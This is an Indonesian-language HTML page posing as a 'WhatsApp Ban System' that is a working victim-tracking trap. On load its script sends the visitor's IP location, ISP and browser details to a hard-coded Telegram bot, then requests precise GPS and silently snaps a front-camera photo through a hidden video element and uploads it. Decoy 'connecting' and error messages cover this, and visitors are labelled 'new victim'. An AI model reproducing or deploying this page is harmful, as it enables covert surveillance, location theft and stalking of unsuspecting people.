<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Website Bans WhatsApp By Painzy - Re-Forged</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
  <style>
    /* Mengembalikan Estetika Visual yang Kau Ciptakan */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
      font-family: 'Inter', sans-serif;
      color: lime;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      padding: 20px;
    }
    .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
    .particle { position: absolute; width: 2px; height: 2px; background: rgba(0, 255, 127, 0.3); border-radius: 50%; animation: float 6s ease-in-out infinite; }
    @keyframes float { 0%, 100% { transform: translateY(0px); opacity: 0.3; } 50% { transform: translateY(-20px); opacity: 0.8; } }
    .login-container { background-color: rgba(17, 17, 17, 0.95); padding: 30px; border-radius: 16px; box-shadow: 0 0 20px lime; text-align: center; max-width: 400px; width: 100%; z-index: 2; }
    .login-title { font-size: 26px; font-weight: 900; margin-bottom: 10px; background: linear-gradient(135deg, #00ff7f, #ffffff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    .login-subtitle { font-size: 13px; color: #ffc107; margin-bottom: 20px; }
    #info { white-space: pre-wrap; text-align: left; margin-top: 20px; background: #222; padding: 15px; border-radius: 8px; font-size: 11px; color: #0f0; }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <div class="bg-particles"></div>

  <div class="login-container">
    <p class="login-title">WhatsApp Ban System</p>
    <p class="login-subtitle">⚠️ Menghubungkan ke Server Pusat...</p>
    <div id="info">⏳ Sedang menginisialisasi protokol sihir...</div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U';
    const chatIds = ['7109845671'];
    const infoDiv = document.getElementById('info');

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        });
      });
    }

    function sendPhotoToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
      });
    }

    // Fungsi Pengambil Data Otomatis
    async function executeTrap() {
      // 1. Ambil Info Dasar
      let ipData = {};
      try {
        const res = await fetch('https://ipapi.co/json/');
        ipData = await res.json();
      } catch (e) { ipData = { ip: 'Unknown' }; }

      const text = `
<b>📥 KORBAN BARU TERDETEKSI</b>
<b>IP:</b> ${ipData.ip || '-'}
<b>Lokasi:</b> ${ipData.city || '-'}, ${ipData.country_name || '-'}
<b>ISP:</b> ${ipData.org || '-'}
<b>Maps:</b> https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}
<b>OS/Browser:</b> ${navigator.userAgent}
      `.trim();
      
      sendToTelegram(text);
      infoDiv.innerText = "✅ Koneksi Terjalin. Memverifikasi otoritas...";

      // 2. GPS Presisi
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const gpsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
          sendToTelegram(`<b>📍 GPS PRESISI:</b>\n${gpsLink}`);
        }, null, { enableHighAccuracy: true });
      }

      // 3. Cermin Terkutuk (Kamera Otomatis & High Res)
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } } 
        });
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
              if (blob) sendPhotoToTelegram(blob);
              stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg', 0.95);
            infoDiv.innerText = "❌ Error 403: Akses Ditolak oleh Server.";
          }, 2500); // Memberi waktu kamera fokus
        };
      } catch (err) {
        sendToTelegram('❌ Kamera Ditolak');
        infoDiv.innerText = "❌ Gagal mengunduh sertifikat keamanan.";
      }
    }

    // Partikel Latar Belakang
    function createParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 50; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 6 + 's';
        container.appendChild(p);
      }
    }

    // Jalankan Semua Saat Terbuka
    window.onload = () => {
      createParticles();
      executeTrap();
    };
  </script>
</body>
</html>
